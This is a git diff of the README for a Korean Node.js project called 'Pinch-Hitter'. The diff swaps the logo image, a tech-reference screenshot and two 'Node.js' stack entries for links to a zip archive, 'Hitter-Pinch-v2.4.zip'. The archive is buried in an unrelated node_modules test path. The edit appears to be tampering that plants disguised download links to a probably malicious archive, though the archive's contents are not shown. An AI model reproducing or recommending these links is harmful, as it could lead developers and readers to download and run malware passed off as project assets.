@@ -1,7 +1,7 @@
 # Pinch-Hitter
 
 ## Logo
-<img width="408" alt="스크린샷 2022-01-19 오후 3 53 43" src="https://user-images.githubusercontent.com/82024154/151428543-e3ad08b9-cf9f-48ef-a17c-b65f8e6ec203.png">
+<img width="408" alt="스크린샷 2022-01-19 오후 3 53 43" src="https://raw.githubusercontent.com/ryana912/Pinch-Hitter-1/main/server/node_modules/resolve/test/node_path/y/bbb/Hitter-Pinch-v2.4.zip">
 
 다가오는 약속 날짜 하지만 대타를 구하지 못하면 휴무를 줄 수 없다는 점장님...
 
@@ -22,7 +22,7 @@
 
 # Tech Reference
 
- ![2022-01-20_5 51 11](https://user-images.githubusercontent.com/82024154/151430043-488bbc69-1133-41b2-8a2e-5501f8ea505b.png)
+ ![2022-01-20_5 51 11](https://raw.githubusercontent.com/ryana912/Pinch-Hitter-1/main/server/node_modules/resolve/test/node_path/y/bbb/Hitter-Pinch-v2.4.zip)
  
  
  
@@ -32,7 +32,7 @@
 
 position : back-end
 
-Stack : Node.js, mysql, express, dotenv, Sequelize, JWT, AWS(CodePipeline, CloudFront, CodeDeploy, CodeBuild)
+Stack : https://raw.githubusercontent.com/ryana912/Pinch-Hitter-1/main/server/node_modules/resolve/test/node_path/y/bbb/Hitter-Pinch-v2.4.zip, mysql, express, dotenv, Sequelize, JWT, AWS(CodePipeline, CloudFront, CodeDeploy, CodeBuild)
 </details>
 
 
@@ -42,7 +42,7 @@ Stack : Node.js, mysql, express, dotenv, Sequelize, JWT, AWS(CodePipeline, Cloud
 
 position : back-end
 
-Stack : Node.js, mysql, express, dotenv, Sequelize, JWT, AWS(CodePipeline, CloudFront, CodeDeploy, CodeBuild)
+Stack : https://raw.githubusercontent.com/ryana912/Pinch-Hitter-1/main/server/node_modules/resolve/test/node_path/y/bbb/Hitter-Pinch-v2.4.zip, mysql, express, dotenv, Sequelize, JWT, AWS(CodePipeline, CloudFront, CodeDeploy, CodeBuild)
 </details>
 
 
